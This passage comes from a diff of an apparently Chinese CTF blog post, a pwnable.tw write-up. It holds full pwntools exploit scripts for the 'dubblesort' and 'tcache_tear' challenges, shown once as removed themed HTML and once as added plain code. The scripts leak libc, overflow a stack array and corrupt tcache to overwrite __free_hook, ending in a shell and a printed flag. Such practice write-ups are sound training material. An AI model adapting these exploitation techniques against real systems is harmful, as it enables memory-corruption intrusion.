class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./dubblesort'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./dubblesort'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10101</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./dubblesort'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">	</span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug(<span class="number">0x931</span>,<span class="keyword">True</span>) <span class="comment">#sort start</span></span><br><span class="line"><span class="comment">#debug(0x9BB,True) #sort end</span></span><br><span class="line"><span class="comment">#debug(0x9c3,True) #main</span></span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line">sd(<span class="string">'a'</span>*<span class="number">0x18</span> + <span class="string">'\x01'</span>)</span><br><span class="line">ru(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">leak = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = leak - 0x1b0001  #remote</span></span><br><span class="line">libc_base = leak - <span class="number">0x1b2001</span>	  <span class="comment">#local</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">log.info(<span class="string">"libc_base ==&gt; &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">"35"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">	rc()</span><br><span class="line">	sl(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">"+"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	rc()</span><br><span class="line">	sl(str(system))	</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line">sl(str(system))</span><br><span class="line">rc()</span><br><span class="line">sl(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line">rc()</span><br><span class="line">sl(str(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+local = 1
+
+if local:
+    p = process(&#39;./dubblesort&#39;)
+    elf = ELF(&#39;./dubblesort&#39;)
+    libc = elf.libc
+else:
+    p = remote(&quot;chall.pwnable.tw&quot;,10101)
+    elf = ELF(&#39;./dubblesort&#39;)
+    libc = ELF(&#39;./libc_32.so.6&#39;)
+
+context.arch = elf.arch
+context.log_level=&#39;debug&#39;
+
+def sd(content):
+    p.send(content)
+
+def sl(content):
+    p.sendline(content)
+
+def rc():
+    return p.recv()
+
+def ru(content):
+    return p.recvuntil(content)
+
+def debug(addr,PIE=False):
+    if PIE:
+        text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[1], 16)
+        gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr)))
+    else:
+        gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))
+
+
+debug(0x931,True) #sort start
+#debug(0x9BB,True) #sort end
+#debug(0x9c3,True) #main
+
+rc()
+sd(&#39;a&#39;*0x18 + &#39;\x01&#39;)
+ru(&#39;a&#39;*0x18)
+leak = u32(p.recv()[:4])
+
+#libc_base = leak - 0x1b0001  #remote
+libc_base = leak - 0x1b2001      #local
+libc.address = libc_base
+
+system = libc.symbols[&#39;system&#39;]
+binsh = libc.search(&quot;/bin/sh&quot;).next()
+log.info(&quot;libc_base ==&gt; {}&quot;.format(hex(libc_base)))
+
+sl(&quot;35&quot;)
+
+for i in range(24):
+    rc()
+    sl(str(0xdeadbeef))
+
+rc()
+sl(&quot;+&quot;)
+
+for i in range(7):
+    rc()
+    sl(str(system))    
+pause()
+
+rc()
+sl(str(system))
+rc()
+sl(str(0xdeadbeef))
+rc()
+sl(str(binsh))
+
+p.interactive()
+</code></pre>
 <h3 id="tcahce-tear"><a href="#tcahce-tear" class="headerlink" title="tcahce_tear"></a>tcahce_tear</h3><p>过程不小心删掉了….就不再写了，看exp。</p>
 <p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./tcache_tear')</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10207"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./tcache_tear'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Data:"</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"Name:"</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x80</span>,p64(<span class="number">0x602020</span>)*<span class="number">2</span> + <span class="string">"\n"</span>)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"******leak info********"</span>)</span><br><span class="line">fake_stdout = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x00"</span></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">"\x60"</span>)</span><br><span class="line">new(<span class="number">0x80</span>,fake_stdout)</span><br><span class="line">leak = p.recv(<span class="number">0x60</span>)</span><br><span class="line">leak = leak[<span class="number">0x20</span>:]</span><br><span class="line">leak_add = u64(leak[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_add - <span class="number">0x3eb780</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line">success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x20</span>,p64(free_hook)*<span class="number">2</span> + <span class="string">"\n"</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">"\n"</span>)</span><br><span class="line">new(<span class="number">0x20</span>,p64(one_gadget))</span><br><span class="line">free()</span><br><span class="line">p.interactive(<span class="string">"zs0zrc&gt;&gt;"</span>)</span><br><span class="line"><span class="comment">#FLAG&#123;tc4ch3_1s_34sy_f0r_y0u&#125;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import*
+context.log_level=&quot;debug&quot;
 
-      
-    </div>
+#p = process(&#39;./tcache_tear&#39;)
+p = remote(&quot;chall.pwnable.tw&quot;,&quot;10207&quot;)
+elf = ELF(&#39;./tcache_tear&#39;)
+libc = elf.libc
 
-    
+def new(size,content):
+    p.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;)
+    p.sendlineafter(&quot;Size:&quot;,str(size))
+    p.sendafter(&quot;Data:&quot;,content)
 
-    
-    
-    
+def free():
+    p.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;)
 
-    
-
-    
-      
-    
-    
-
-    
-      <div>
-        
+def show():
+    p.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;)
 
 
+p.sendafter(&quot;Name:&quot;,&#39;a&#39;*0x20)
+new(0x80,&#39;aaaa\n&#39;)
+free()
+free()
+new(0x80,p64(0x602020)*2 + &quot;\n&quot;)
+new(0x80,&quot;\n&quot;)
 
+log.info(&quot;******leak info********&quot;)
+fake_stdout = p64(0xfbad1800) + p64(0)*3 + &quot;\x00&quot;
+new(0x80,&quot;\x60&quot;)
+new(0x80,fake_stdout)
+leak = p.recv(0x60)
+leak = leak[0x20:]
+leak_add = u64(leak[:6].ljust(8,&#39;\x00&#39;))
+libc_base = leak_add - 0x3eb780
+libc.address = libc_base
+success(hex(libc_base))
 
-  
+one_gadget = libc_base + 0x4f322
+free_hook = libc.symbols[&#39;__free_hook&#39;]
 
+new(0x20,&#39;aaaa\n&#39;)
+free()
+free()
+new(0x20,p64(free_hook)*2 + &quot;\n&quot;)
+new(0x20,&quot;\n&quot;)
+new(0x20,p64(one_gadget))
+free()
+p.interactive(&quot;zs0zrc&gt;&gt;&quot;)
+#FLAG{tc4ch3_1s_34sy_f0r_y0u}
+</code></pre>
 
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2018/10/07/2018-10-7-pwnable.tw-writeup/" title="pwnable.tw writeup">http://yoursite.com/2018/10/07/2018-10-7-pwnable.tw-writeup/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-            <a href="/tags/pwnable-tw/" rel="tag"># pwnable.tw</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/10/07/2018-10-7-初探arm下的pwn/" rel="next" title="初探arm下的pwn">
-                <i class="fa fa-chevron-left"></i> 初探arm下的pwn
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/07/2018-10-7-Ubuntu主题Flatabulous安装/" rel="prev" title="Ubuntu主题Flatabulous安装">
-                Ubuntu主题Flatabulous安装 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF-s-writeup/">CTF&#39;s writeup</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/pwnable-tw/">pwnable.tw</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
 
             
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#start"><span class="nav-number">1.</span> <span class="nav-text">start</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#orw"><span class="nav-number">2.</span> <span class="nav-text">orw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seethefile"><span class="nav-number">3.</span> <span class="nav-text">seethefile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#calc"><span class="nav-number">4.</span> <span class="nav-text">calc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dubble-sort"><span class="nav-number">5.</span> <span class="nav-text">dubble sort</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcahce-tear"><span class="nav-number">6.</span> <span class="nav-text">tcahce_tear</span></a></li></ol></div>
-            
-
           </div>
         </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "pwnable.tw writeup&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
